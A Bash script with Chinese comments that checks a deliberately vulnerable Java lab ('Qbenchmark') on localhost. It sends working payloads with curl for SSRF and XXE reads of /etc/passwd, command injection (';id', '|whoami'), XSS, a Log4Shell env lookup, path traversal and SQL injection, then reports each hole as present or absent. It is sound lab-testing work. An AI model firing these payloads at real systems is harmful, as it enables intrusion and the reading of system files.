#!/bin/bash
# Qbenchmark 漏洞快速验证脚本
# 用于快速验证 Java 靶场中的各类漏洞

TARGET="http://localhost:8080"
PASS="\033[0;32m✅\033[0m"
FAIL="\033[0;31m❌\033[0m"
WARN="\033[1;33m⚠️\033[0m"

echo "========================================"
echo "   Qbenchmark 漏洞快速验证"
echo "   目标: $TARGET"
echo "========================================"

# 检查服务器状态
echo -e "\n检查服务器状态..."
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" $TARGET)
if [ "$HTTP_CODE" = "200" ]; then
    echo -e "服务器状态: $PASS 运行中"
else
    echo -e "服务器状态: $FAIL 未运行 (HTTP $HTTP_CODE)"
    exit 1
fi

echo ""
echo "========================================"
echo "   漏洞验证测试"
echo "========================================"

# 1. SSRF - file://
echo -e "\n【1】SSRF (file://)"
RESULT=$(curl -s "$TARGET/ssrf/urlconnection/vuln?url=file:///etc/passwd" | grep -c "root:")
if [ "$RESULT" -gt 0 ]; then
    echo -e "$PASS 存在 - 成功读取 /etc/passwd"
else
    echo -e "$FAIL 不存在"
fi

# 2. SSRF - 内网扫描
echo -e "\n【2】SSRF (内网扫描)"
RESULT=$(curl -s "$TARGET/ssrf/httpurl/vuln?url=http://127.0.0.1:22" | head -1 | grep -c "SSH\|Protocol\|Failed")
if [ "$RESULT" -gt 0 ] || [ "$(curl -s "$TARGET/ssrf/httpurl/vuln?url=http://127.0.0.1:22" | wc -c)" -gt 0 ]; then
    echo -e "$PASS 存在 - 内网端口可扫描"
else
    echo -e "$WARN 可能不存在"
fi

# 3. Command Injection - Runtime
echo -e "\n【3】Command Injection (Runtime)"
RESULT=$(curl -s "$TARGET/cmd/runtime/vuln?filename=x%3Bcat%20/etc/hostname" | grep -c "/etc/hostname")
if [ "$RESULT" -gt 0 ]; then
    echo -e "$PASS 存在 - 命令注入成功"
else
    echo -e "$FAIL 不存在"
fi

# 4. Command Injection - ProcessBuilder
echo -e "\n【4】Command Injection (ProcessBuilder)"
RESULT=$(curl -s "$TARGET/cmd/processbuilder/vuln?dir=/tmp%3Bid" | grep -c "root\|uid=")
if [ "$RESULT" -gt 0 ]; then
    echo -e "$PASS 存在 - 命令注入成功"
else
    echo -e "$FAIL 不存在"
fi

# 5. Command Injection - Ping
echo -e "\n【5】Command Injection (Ping)"
RESULT=$(curl -s "$TARGET/cmd/ping/vuln?host=8.8.8.8%7Cwhoami" | grep -c "bytes\|PING")
if [ "$RESULT" -gt 0 ]; then
    echo -e "$PASS 存在 - ping 功能可用"
else
    echo -e "$WARN 可能不存在"
fi

# 6. Command Injection - Header
echo -e "\n【6】Command Injection (Header)"
RESULT=$(curl -s -H "X-Command:;whoami" "$TARGET/cmd/header/vuln" | grep -c "root")
if [ "$RESULT" -gt 0 ]; then
    echo -e "$PASS 存在 - Header 注入成功"
else
    echo -e "$FAIL 不存在"
fi

# 7. XSS - Reflected
echo -e "\n【7】XSS (反射型)"
RESULT=$(curl -s "$TARGET/xss/reflect?vuln=%3Cscript%3Ealert(1)%3C/script%3E" | grep -c "alert(1)")
if [ "$RESULT" -gt 0 ]; then
    echo -e "$PASS 存在 - payload 原样反射"
else
    echo -e "$FAIL 不存在"
fi

# 8. XSS - Search
echo -e "\n【8】XSS (搜索场景)"
RESULT=$(curl -s "$TARGET/xss/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E" | grep -c "alert(1)")
if [ "$RESULT" -gt 0 ]; then
    echo -e "$PASS 存在 - payload 注入 HTML"
else
    echo -e "$FAIL 不存在"
fi

# 9. Log4Shell
echo -e "\n【9】Log4Shell (CVE-2021-44228)"
RESULT=$(curl -s "$TARGET/log4j/vuln?token=\${env:USER}" | grep -c "USER")
if [ "$RESULT" -gt 0 ]; then
    echo -e "$PASS 存在 - 环境变量泄露"
else
    echo -e "$FAIL 不存在"
fi

# 10. Path Traversal - Absolute
echo -e "\n【10】Path Traversal (绝对路径)"
RESULT=$(curl -s "$TARGET/path/absolute/vuln?path=/etc/passwd" | grep -c "root:")
if [ "$RESULT" -gt 0 ]; then
    echo -e "$PASS 存在 - 任意文件读取"
else
    echo -e "$FAIL 不存在"
fi

# 11. SQL Injection
echo -e "\n【11】SQL Injection (MySQL)"
RESULT=$(curl -s "$TARGET/sqli/jdbc/vuln?username=admin%27%20OR%20%271%27%3D%271" | wc -l)
if [ "$RESULT" -gt 2 ]; then
    echo -e "$PASS 存在 - OR 注入返回多行"
elif [ "$(curl -s "$TARGET/sqli/jdbc/vuln?username=admin" | grep -c "Database error")" -gt 0 ]; then
    echo -e "$WARN 端点存在但数据库未连接"
else
    echo -e "$FAIL 不存在"
fi

# 12. SQL Injection - LIKE
echo -e "\n【12】SQL Injection (LIKE 子句)"
RESULT=$(curl -s "$TARGET/sqli/like/vuln?username=admin%27%20OR%20%271%27%3D%271" | grep -c "admin")
if [ "$RESULT" -gt 0 ]; then
    echo -e "$PASS 存在 - LIKE 注入可用"
else
    echo -e "$FAIL 不存在"
fi

# 13. SQL Injection - ORDER BY
echo -e "\n【13】SQL Injection (ORDER BY)"
RESULT=$(curl -s "$TARGET/sqli/order/vuln?sort=id" | grep -c "admin")
if [ "$RESULT" -gt 0 ]; then
    echo -e "$PASS 存在 - ORDER BY 可用"
else
    echo -e "$FAIL 不存在"
fi

# 14. Jackson 反序列化
echo -e "\n【14】Jackson 反序列化"
RESULT=$(curl -s -X POST "$TARGET/deserialize/jackson" -H "Content-Type: application/json" -d '{"test":"value"}' | grep -c "Jackson")
if [ "$RESULT" -gt 0 ]; then
    echo -e "$PASS 端点可用 - Jackson 反序列化"
else
    echo -e "$FAIL 端点不存在"
fi

# 15. Fastjson 反序列化
echo -e "\n【15】Fastjson 反序列化"
RESULT=$(curl -s -X POST "$TARGET/fastjson/deserialize" -H "Content-Type: application/json" -d '{"name":"test","value":"123"}' | grep -c "Fastjson")
if [ "$RESULT" -gt 0 ]; then
    echo -e "$PASS 端点可用 - Fastjson 反序列化"
else
    echo -e "$FAIL 端点不存在"
fi

# 16. Shiro 反序列化
echo -e "\n【16】Shiro rememberMe 反序列化"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/shiro/deserialize")
if [ "$HTTP_CODE" = "200" ]; then
    echo -e "$PASS 端点可用 - Shiro 反序列化"
else
    echo -e "$FAIL 端点不存在 (HTTP $HTTP_CODE)"
fi

# 17. Cookie 反序列化
echo -e "\n【17】Cookie 反序列化 (rememberMe)"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/deserialize/rememberMe/vuln")
if [ "$HTTP_CODE" = "200" ]; then
    echo -e "$PASS 端点可用 - Cookie 反序列化"
else
    echo -e "$FAIL 端点不存在 (HTTP $HTTP_CODE)"
fi


# 18. XMLReader XXE
echo -e "\n【18】XMLReader XXE"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET/xxe/xmlReader/vuln" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>')
if [ "$HTTP_CODE" = "200" ]; then
    echo -e "$PASS 端点可用 - XMLReader XXE"
else
    echo -e "$FAIL 端点不存在 (HTTP $HTTP_CODE)"
fi

# 19. SAXBuilder XXE
echo -e "\n【19】SAXBuilder XXE (JDOM2)"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET/xxe/saxBuilder/vuln" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>')
if [ "$HTTP_CODE" = "200" ]; then
    echo -e "$PASS 端点可用 - SAXBuilder XXE"
else
    echo -e "$FAIL 端点不存在 (HTTP $HTTP_CODE)"
fi

# 20. DocumentBuilder XXE
echo -e "\n【20】DocumentBuilder XXE"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET/xxe/documentBuilder/vuln" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>')
if [ "$HTTP_CODE" = "200" ]; then
    echo -e "$PASS 端点可用 - DocumentBuilder XXE"
else
    echo -e "$FAIL 端点不存在 (HTTP $HTTP_CODE)"
fi

echo ""
echo "========================================"
echo "   验证完成"
echo "========================================"
echo ""
echo "详细 payload 文件位置: validation/payloads/"
echo "  - sqli_payloads.txt"
echo "  - ssrf_payloads.txt"
echo "  - cmd_payloads.txt"
echo "  - xss_payloads.txt"
echo "  - log4shell_payloads.txt"
echo "  - path_traversal_payloads.txt"
echo "  - deserialize_payloads.txt"
echo "  - xxe_payloads.txt (新增)"
echo ""
